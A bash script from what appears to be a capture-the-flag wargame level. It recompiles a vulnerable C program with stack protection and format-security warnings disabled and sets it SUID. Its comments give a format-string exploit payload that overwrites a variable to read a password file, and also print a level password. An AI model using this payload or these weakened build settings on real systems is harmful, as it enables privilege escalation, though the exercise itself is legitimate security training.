#!/bin/bash
# This script will allow to test the pseudo code in source.c file by copy it in the folder /tmp in the VM

# -------------------------------- PREREQUIRES -------------------------------- #
#                            From your local machine                            #
#       Copy the source and the script files in the tmp folder in your VM       #
#                  scp -P 4242 path/source.c level4@VM_IP:/tmp                  #
#                  scp -P 4242 path/script.sh level4@VM_IP:/tmp                 #
#                                                                               #
#     pwd: b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa     #
#                                                                               #
#                                                                               #
#                                                                               #
#                   Don't forget to run it ;) bash script.sh                    #
# ----------------------------------------------------------------------------- #

# Compile the program
gcc -fno-stack-protector -Wno-format-security source.c -o ft_level3
# -fno-stack-protector : https://stackoverflow.com/questions/1345670/stack-smashing-detected
# -Wno-format-security : https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html

# Set SUID to give root user permissions
chmod u+s ft_level3

# Add write and execution permissions on home directory
chmod +wx ~

# Move the program to home directory
mv ft_level3 ~


# Then you have to run the program and cat .pass as level3 by taping manually these commands

#	su level3
#	// check the new address of variable 'm', in this exemple it is 0x804a04c
#	python -c 'print "\x4c\xa0\x04\x08" + "a" * 60 + "%4$n"' > /tmp/exploit
#	cat /tmp/exploit - | /home/user/level4/ft_level3
#	cat /home/user/level4/.pass
